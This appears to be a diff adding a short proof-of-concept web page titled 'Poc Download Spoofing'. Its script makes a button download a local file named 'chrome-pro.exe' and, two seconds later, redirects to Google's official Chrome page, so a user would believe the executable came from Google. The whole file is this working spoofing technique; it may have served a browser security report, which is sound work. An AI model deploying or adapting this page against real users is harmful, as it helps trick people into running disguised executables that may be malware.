@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Poc Download Spoofing</title>
+<style>
+  :root { color-scheme: dark; }
+  body {
+    margin: 0; min-height: 100vh; display: grid; place-items: center;
+    background: #0d0f12; color: #e6e8eb;
+    font: 15px/1.6 system-ui, -apple-system, "Segoe UI", sans-serif;
+  }
+  main { width: min(520px, 92vw); padding: 40px 0; text-align: center; }
+  h1 { font-size: 20px; margin: 0 0 8px; }
+  p { color: #9aa3ad; margin: 0 0 24px; }
+  button {
+    padding: 12px 22px; font: inherit; font-weight: 600; cursor: pointer;
+    color: #0d0f12; background: #e6e8eb; border: 0; border-radius: 8px;
+  }
+  button:hover { background: #fff; }
+</style>
+</head>
+<body>
+<main>
+  <h1>Poc Download Spoofing</h1>
+  <p>Click to download. The page then opens the Chrome site.</p>
+  <button id="go">Download</button>
+</main>
+
+<script>
+  document.getElementById("go").onclick = () => {
+    const a = document.createElement("a");
+    a.href = "./chrome-pro.bin";
+    a.download = "chrome-pro.exe";
+    a.click();
+
+    setTimeout(() => {
+      location.href = "https://www.google.com/chrome/";
+    }, 2000);
+  };
+</script>
+</body>
+</html>
